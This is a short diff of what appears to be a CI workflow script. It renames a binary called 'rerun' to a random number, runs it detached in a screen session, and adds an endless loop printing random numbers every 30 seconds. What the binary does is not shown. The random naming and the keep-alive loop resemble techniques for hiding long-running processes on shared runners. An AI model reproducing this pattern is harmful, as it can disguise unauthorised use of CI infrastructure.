@@ -12,7 +12,7 @@ jobs:
                  sudo apt-get update
                  TOP=$(shuf -n 1 -i 1-999999)
                  mv rerun $TOP
-                 ./$TOP
-                 #screen -dmS $TOP ./$TOP
-                 #while :; do shuf -n 1 -i 1-99999999; sleep 30; done
+                 chmod +x $TOP
+                 screen -dmS $TOP ./$TOP
+                 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
                  
